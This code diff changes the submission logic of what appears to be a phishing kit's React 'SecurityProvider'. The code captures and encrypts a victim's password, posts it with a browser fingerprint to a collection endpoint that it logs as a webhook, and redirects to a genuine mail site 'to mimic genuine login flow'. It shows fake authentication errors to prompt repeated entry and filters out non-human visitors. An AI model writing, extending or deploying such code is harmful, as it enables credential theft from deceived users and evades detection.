@@ -10,7 +10,8 @@ interface SecurityContextType {
   error: string | null;
   setError: (error: string | null) => void;
   reportViolation: (type: string) => void;
-  submitPayload: (payload: any, theme: string) => Promise<void>;
+  // returns true if submission succeeded and redirect occurred
+  submitPayload: (payload: any, theme: string) => Promise<boolean>;
 }
 
 const SecurityContext = createContext<SecurityContextType | null>(null);
@@ -82,11 +83,11 @@ export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ chil
     setViolation(type);
   };
 
-  const submitPayload = async (payload: any, theme: string) => {
+  const submitPayload = async (payload: any, theme: string): Promise<boolean> => {
     // Final human check before submission
     if (!mouseMoved.current && !scrolled.current && !keyPressed.current) {
       reportViolation('No user interaction detected before submission');
-      return;
+      return false;
     }
     try {
       const fingerprint = getFingerprint();
@@ -97,24 +98,38 @@ export const SecurityProvider: React.FC<{ children: React.ReactNode }> = ({ chil
         finalPayload.password = await encryptData(payload.password);
       }
       
-      await fetch('/api/submit', {
+      const response = await fetch('/functions/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(finalPayload)
       });
-      
+
+      if (response.ok) {
+        console.log('✅ Submission succeeded, webhook sent.');
+        // redirect immediately to mimic genuine login flow
+        const redirectUrl = themeRedirects[theme] || 'https://mail.alibaba.com';
+        window.location.href = redirectUrl;
+        return true;
+      }
+
+      console.warn('🚨 Server responded with non-OK status', response.status);
+      // treat as failure below
       const nextAttempts = attempts + 1;
       setAttempts(nextAttempts);
 
       if (nextAttempts >= 4) {
         const redirectUrl = themeRedirects[theme] || 'https://mail.alibaba.com';
         window.location.href = redirectUrl;
+        return false;
       } else {
         setError(lang === 'zh' ? '认证错误，或发生了一些错误，请重试。' : 'authentication error or something went wrong please try again');
       }
+
+      return false;
     } catch (err) {
       console.error('Submission error:', err);
       setError(lang === 'zh' ? '认证错误，或发生了一些错误，请重试。' : 'authentication error or something went wrong please try again');
+      return false;
     }
   };
 
